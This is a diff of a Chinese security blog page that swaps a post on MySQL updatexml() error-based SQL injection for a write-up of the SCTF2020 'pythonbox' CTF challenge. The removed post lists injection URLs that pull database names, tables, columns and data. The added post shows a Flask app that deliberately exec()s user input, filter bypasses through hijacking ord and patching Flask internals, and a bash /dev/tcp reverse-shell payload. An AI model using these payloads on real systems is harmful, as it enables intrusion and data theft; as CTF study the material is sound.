@@ -15,26 +15,22 @@
 
 
 
-<meta name="description" content="0x01updatexml()的正常作用updatexml()是MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数。">
+<meta name="description" content="比赛中觉得这道题有点意思,解题的思路也用很多(虽然都是函数劫持但很巧妙),有的构思十分恰妙,故写文以记下.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="关于updatexml()报错注入的思考">
-<meta property="og:url" content="lexsd6.github.io/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/index.html">
+<meta property="og:title" content="\[sctf2020\]pythonbox题目复现小记">
+<meta property="og:url" content="lexsd6.github.io/2020/07/15/rgbCTF--wp/index.html">
 <meta property="og:site_name" content="lexsd6&#39;s home">
-<meta property="og:description" content="0x01updatexml()的正常作用updatexml()是MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数。">
+<meta property="og:description" content="比赛中觉得这道题有点意思,解题的思路也用很多(虽然都是函数劫持但很巧妙),有的构思十分恰妙,故写文以记下.">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="lexsd6.github.io/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/iamge-updatexml1.png">
-<meta property="og:image" content="lexsd6.github.io/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/image-20200320235648716.png">
-<meta property="og:image" content="lexsd6.github.io/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/image-20200321131351700.png">
-<meta property="og:image" content="lexsd6.github.io/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/image-20200321002711168.png">
-<meta property="og:image" content="lexsd6.github.io/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/image-20200321160707020.png">
-<meta property="og:image" content="lexsd6.github.io/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/image-20200321161640552.png">
-<meta property="og:image" content="lexsd6.github.io/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/image-20200324151215694.png">
-<meta property="article:published_time" content="2019-11-13T01:23:36.000Z">
-<meta property="article:modified_time" content="2020-05-17T16:03:03.434Z">
+<meta property="og:image" content="lexsd6.github.io/2020/07/15/rgbCTF--wp/image-20200715001759238.png">
+<meta property="og:image" content="lexsd6.github.io/2020/07/15/rgbCTF--wp/image-20200715142352986.png">
+<meta property="article:published_time" content="2020-07-15T06:39:40.312Z">
+<meta property="article:modified_time" content="2020-07-15T06:59:32.274Z">
 <meta property="article:author" content="lexsd6">
-<meta property="article:tag" content="mysql">
+<meta property="article:tag" content="python">
+<meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="lexsd6.github.io/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/iamge-updatexml1.png">
+<meta name="twitter:image" content="lexsd6.github.io/2020/07/15/rgbCTF--wp/image-20200715001759238.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -68,7 +64,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>关于updatexml()报错注入的思考 | lexsd6&#39;s home</title>
+<title>\[sctf2020\]pythonbox题目复现小记 | lexsd6&#39;s home</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -272,11 +268,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-关于updatexml()报错注入的思考" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-rgbCTF--wp" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/" class="article-date">
-      <time datetime="2019-11-13T01:23:36.000Z" itemprop="datePublished">2019-11-13</time>
+      <a href="/2020/07/15/rgbCTF--wp/" class="article-date">
+      <time datetime="2020-07-15T06:39:40.312Z" itemprop="datePublished">2020-07-15</time>
 </a>
 
 
@@ -291,7 +287,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      关于updatexml()报错注入的思考
+      \[sctf2020\]pythonbox题目复现小记
     </h1>
   
 
@@ -306,7 +302,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/mysql/" rel="tag">mysql</a></li></ul>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -316,41 +312,57 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="0x01updatexml-的正常作用"><a href="#0x01updatexml-的正常作用" class="headerlink" title="0x01updatexml()的正常作用"></a>0x01updatexml()的正常作用</h2><p>updatexml()是MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数。<a id="more"></a>其正常语法：<br><code>UPDATEXML (XML_document, XPath_string, new_value);</code><br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值</p>
-<p>如下是关于它正常用法的掩饰。</p>
-<p>(1)执行如下sql语言创建环境：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE  xml1 (xxx VARCHAR(150));#创建一个表</span><br><span class="line">INSERT INTO xml1 VALUES</span><br><span class="line">(&#39;</span><br><span class="line">&lt;values&gt; </span><br><span class="line">&lt;name&gt;lexsd6&lt;&#x2F;name&gt;</span><br><span class="line">&lt;text&gt;frist xml date&lt;&#x2F;text&gt;</span><br><span class="line">&lt;&#x2F;values&gt;&#39;);#插入第一个数据</span><br><span class="line">INSERT INTO xml1 VALUES</span><br><span class="line">(&#39;</span><br><span class="line">&lt;values&gt; </span><br><span class="line">&lt;name&gt;lexs&lt;&#x2F;name&gt;</span><br><span class="line">&lt;text&gt;secend xml date&lt;&#x2F;text&gt;</span><br><span class="line">&lt;&#x2F;values&gt;&#39;);#插入第二个数据</span><br></pre></td></tr></table></figure>
+        <p>比赛中觉得这道题有点意思,解题的思路也用很多(虽然都是函数劫持但很巧妙),有的构思十分恰妙,故写文以记下.</p>
+<a id="more"></a>
 
-<p>(2) 使用<code>select * from xml1</code>查看</p>
-<p><img src="iamge-updatexml1.png" alt="updatexml1"></p>
-<p>（3）执行<code>SELECT updatexml(title,&#39;/values/text&#39;,&#39;one&#39;) FROM xml1;</code>语句。发现执行后，原来有<text>标签的地方连同标签里的内容都被替换成了‘one’。</p>
-<p><img src="image-20200320235648716.png" alt="image-20200320235648716"></p>
-<h2 id="0x02updatexml-报错注入的原因及注意点"><a href="#0x02updatexml-报错注入的原因及注意点" class="headerlink" title="0x02updatexml()报错注入的原因及注意点"></a>0x02updatexml()报错注入的原因及注意点</h2><p>由于updatexml的第二个参数需要<u><strong>Xpath</strong></u>格式的字符串,但如果在提交的不符合和Xpath格式,会用报错的形式将执行后的结果回显出了来.</p>
-<p>例如:执行sql语句<code>select updatexml(1,concat(0x7e,(select database()),0x7e),1);</code>后,可以看到回显:</p>
-<p><img src="image-20200321131351700.png" alt="image-20200321131351700"></p>
-<p>如上图,原本<code>select database()</code>的地方被执行了,显示出数据库名–bookshop.</p>
-<p>在这里要注意的事：</p>
-<p>(1.)由于updatexml的保错回显只能返回一个属性，所以如果一个表中用多行，需要用‘limit’来限制行数（元组数）为一。</p>
-<p>(2.)在构建第二个参数时，要确保第二个参数不符合Xpath格式。有的函数符合Xpath格式可以用concat(‘不符合Xpath格式的字符串’,’要执行的恶意sql语句’)来构造’’</p>
-<p><img src="image-20200321002711168.png" alt="image-20200321002711168"></p>
-<p>(3.)若要注入出的数据格式就是xml结构的数据则可以直接在第二个参数select:</p>
-<p><img src="image-20200321160707020.png" alt="image-20200321160707020"></p>
-<p>(4.)用这个方法注出来的数据有长度限制。且在恶意代码前的参数字符越多，注出的有效信息越少。（如下图）.</p>
-<p><img src="image-20200321161640552.png" alt="image-20200321161640552"></p>
-<p>so在有一张表有多行时最好用limit 一行一行查询,慎重使用group_concat函数.(group_concat可能显示不全,用substr来截取拼接)</p>
-<p><img src="image-20200324151215694.png" alt="image-20200324151215694"></p>
-<h2 id="0x03updatexml-的注入"><a href="#0x03updatexml-的注入" class="headerlink" title="0x03updatexml()的注入"></a>0x03updatexml()的注入</h2><p>(1.)爆数据库版本信息</p>
-<p><a href="http://127.0.0.1/sql.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql.php?id=1</a> and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) ;#</p>
-<p>(2.)爆出用户</p>
-<p><a href="http://127.0.0.1/sql.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql.php?id=1</a> and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)  ;#</p>
-<p>(3.)爆出所用数据库</p>
-<p><a href="http://127.0.0.1/sql.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql.php?id=1</a> and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) ；#</p>
-<p>(4.)爆全部数据库</p>
-<p><a href="http://www.hackblog.cn/sql.php?id=1" target="_blank" rel="noopener">http://www.hackblog.cn/sql.php?id=1</a> and uand  updatexml(1,concat(0x7e,(SELECT schema_name from information_schema.SCHEMATA  limit 0,1),0x7e),1);#</p>
-<p>(5.)爆表<br><a href="http://127.0.0.1/sql.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql.php?id=1</a> and updatexml(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1);#</p>
-<p>(6.)爆字段</p>
-<p><a href="http://127.0.0.1/sql.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql.php?id=1</a> and updatexml(1,concat(0x7e,(SELECT column_name from information_schema.columns where table_name=’xml1’ limit 0,1),0x7e),1);#</p>
-<p>(7.)爆字段内容<br><a href="http://127.0.0.1/sql.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql.php?id=1</a> and  updatexml(1,concat(0x7e,(SELECT  title from xml1 limit 0,1),0x7e),1);#</p>
+<p>我这里因为环境有问题,本地post数据会蜜汁丢失(tcl,还没找到原因),所以把原题中的post部分改成了get但对思路来说无伤大雅.具体代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=["GET"])#源题是methods=["POST"]</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">security</span><span class="params">()</span>:</span></span><br><span class="line">    secret =request.args[<span class="string">"cmd"</span>]<span class="comment">#源题是request.form</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> secret:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">42</span> &lt;= ord(i) &lt;= <span class="number">122</span>: <span class="keyword">return</span> <span class="string">"error!"</span></span><br><span class="line">   </span><br><span class="line">    exec(secret)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">"xXXxXXx"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">"0.0.0.0"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>由于出题人要求要rec，so题目的核心在于如何在：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> secret:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">42</span> &lt;= ord(i) &lt;= <span class="number">122</span>: <span class="keyword">return</span> <span class="string">"error!"</span></span><br></pre></td></tr></table></figure>
+
+<p>即，没有引号、小括号、空格的情况下函数调用或继承链的构建。</p>
+<p>在python中没有大小引号，我们就没法构件字符串。而命令执行函数调用的参数需要是字符串，继承链的构建中也需要字符串来做索引。</p>
+<h3 id="构造字符串"><a href="#构造字符串" class="headerlink" title="构造字符串"></a>构造字符串</h3><p>先说下没有引号怎么构造吧。</p>
+<p>1.利用<code>flask.__dor__</code>构造,<code>flask.__dor__</code>会返回字符串利用python字符串特性进行切片拼接.</p>
+<p>2.利用request.host、request.content_md5、request.content_encoding这些返回值直接就是字符串的request属性获取字符串。</p>
+<p>3.利用i，secret这些已存在的字符串进行处理后，作为request.args/request.form的索引进行传参。</p>
+<h3 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h3><p>有了字符串后，我们就可以编造一些简单的继承链来修改一些配置与函数了，但是依然不能调用命令执行相关的函数，因为在python如要对函数进行有参数的调用必须要小括号。所以如何调用命令执行相关的函数是一个问题。</p>
+<h4 id="劫持ord函数"><a href="#劫持ord函数" class="headerlink" title="劫持ord函数"></a>劫持ord函数</h4><p>由于ord函数是在<code>__builtins__</code>里，我们可以通过继承链关系找到<code>__builtins__.__dict__[‘ord’]</code>再用一个返回值在42与122间的函数覆盖它，这样我们第二次访问时 ，无论传入什么函数都可以绕过bypass。</p>
+<p>这里有个小技巧，在lambda构造有默认参数的匿名函数时不需要空格来区分形参，只需要在形参面前加个<code>*</code>号。例如：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">'ord'</span>] = <span class="keyword">lambda</span>*args:<span class="number">42</span></span><br></pre></td></tr></table></figure>
+
+<p> 这样，调用ord时，ord无论参数是什么都只能返回42。</p>
+<p>完整payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#第一次</span></span><br><span class="line">cmd=__builtins__.__dict__[request.content_md5] = <span class="keyword">lambda</span>*args:<span class="number">42</span></span><br><span class="line">在包中添加头： content_md5:ord</span><br><span class="line"><span class="comment">#第二次</span></span><br><span class="line">cmd=__import__(<span class="string">'os'</span>).system(\<span class="string">"bash -c 'bash -i &gt;&amp; /dev/tcp/my_ip/23333 0&gt;&amp;1'\")</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="patch-flask自己的函数"><a href="#patch-flask自己的函数" class="headerlink" title="patch flask自己的函数"></a>patch flask自己的函数</h4><p>我们在审计flask代码时，会发现几个有趣的参数finalize_request、process_response、after_request_functions。他们在flask中的运行机制是</p>
+<p>1。一旦web应用接收到reques，会调用finalize_request。</p>
+<p>2。finalize_request首先会对请求使用make_response方法进行处理，该方法会将视图函数的返回值（response对象或者一个元组）封装成一个response对象。</p>
+<p>3。调用 process_response 方法，使用 after_request_functions 当中的函数进行处理，返回处理过后的response。</p>
+<p>4。如果抛出异常，raise</p>
+<p>因此我们可以：</p>
+<p>让<code>process_response=exec</code>,<code>make_response</code>值为我们想执行的代码</p>
+<p>具体操作如下：</p>
+<p>方法1：直接更改process_response</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/?cmd=Flask.__doc__=request.args[secret[0]];app.make_response=lambda*p:Flask.__doc__;app.process_response=exec;&amp;F=print(‘lexsd6’)</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20200715001759238.png" alt="image-20200715001759238"></p>
+<p>方法2：通过after_request_functions更改process_response：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/?cmd=Flask.__doc__=request.args[secret[0]];app.make_response=lambda*p:Flask.__doc__;app.after_request_funcs[None]=[exec];&amp;F=print(‘lexsd6’)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="image-20200715142352986.png" alt="image-20200715142352986"></p>
+<h4 id="patch-url-parse"><a href="#patch-url-parse" class="headerlink" title="patch url_parse"></a>patch url_parse</h4><p>url_parse  是一个处理url的函数我们可以让它为eval,这样url中<code>/</code>后的数据将会当成eval的参数来执行.</p>
+<p>具体可以看官方wp:</p>
+<p><a href="https://ctftime.org/writeup/22157" target="_blank" rel="noopener">https://ctftime.org/writeup/22157</a></p>
+<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p><a href="https://pham-nuwens-document.readthedocs.io/zh/latest/flask%E5%AD%A6%E4%B9%A0/flask%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3.html" target="_blank" rel="noopener">flask流程详解</a></p>
+<p><a href="https://imagin.vip/?p=1489#pysandbox" target="_blank" rel="noopener">https://imagin.vip/?p=1489#pysandbox</a></p>
+<p><a href="http://www.l-team.org/archives/379.html" target="_blank" rel="noopener">http://www.l-team.org/archives/379.html</a></p>
+<p><a href="https://ctftime.org/writeup/22157" target="_blank" rel="noopener">https://ctftime.org/writeup/22157</a></p>
 
       
     </div>
@@ -359,13 +371,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/">关于updatexml()报错注入的思考</a></p>
+        <p><span>本文标题:</span><a href="/2020/07/15/rgbCTF--wp/">\[sctf2020\]pythonbox题目复现小记</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">lexsd6</a></p>
-        <p><span>发布时间:</span>2019-11-13, 09:23:36</p>
-        <p><span>最后更新:</span>2020-05-18, 00:03:03</p>
+        <p><span>发布时间:</span>2020-07-15, 14:39:40</p>
+        <p><span>最后更新:</span>2020-07-15, 14:59:32</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/" title="关于updatexml()报错注入的思考">lexsd6.github.io/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/</a>
-            <span class="copy-path" data-clipboard-text="原文: lexsd6.github.io/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/　　作者: lexsd6" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2020/07/15/rgbCTF--wp/" title="\[sctf2020\]pythonbox题目复现小记">lexsd6.github.io/2020/07/15/rgbCTF--wp/</a>
+            <span class="copy-path" data-clipboard-text="原文: lexsd6.github.io/2020/07/15/rgbCTF--wp/　　作者: lexsd6" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -377,16 +389,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2020/03/27/python%20%E5%85%B3%E4%BA%8E%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/">
-                    关于python ssti的思考
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2019/10/03/hello-world/">
-                    Hello World
+                <a href="/2020/06/22/%E5%AF%B9linux%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%80%BB%E7%BB%93/">
+                    对linux 命令执行的总结
                 </a>
             </div>
         
@@ -398,7 +404,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01updatexml-的正常作用"><span class="toc-text">0x01updatexml()的正常作用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02updatexml-报错注入的原因及注意点"><span class="toc-text">0x02updatexml()报错注入的原因及注意点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03updatexml-的注入"><span class="toc-text">0x03updatexml()的注入</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#构造字符串"><span class="toc-text">构造字符串</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#函数调用"><span class="toc-text">函数调用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#劫持ord函数"><span class="toc-text">劫持ord函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#patch-flask自己的函数"><span class="toc-text">patch flask自己的函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#patch-url-parse"><span class="toc-text">patch url_parse</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考文献"><span class="toc-text">参考文献</span></a></li></ol>
         
     </div>
     <style>
@@ -434,7 +440,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"关于updatexml()报错注入的思考　| lexsd6's home　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"\[sctf2020\]pythonbox题目复现小记　| lexsd6's home　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -454,15 +460,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2020/03/27/python%20%E5%85%B3%E4%BA%8E%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/" title="上一篇: 关于python ssti的思考">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2019/10/03/hello-world/" title="下一篇: Hello World">
+            <a href="/2020/06/22/%E5%AF%B9linux%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%80%BB%E7%BB%93/" title="下一篇: 对linux 命令执行的总结">
                 <i class="fa fa-angle-right"></i>
             </a>
         
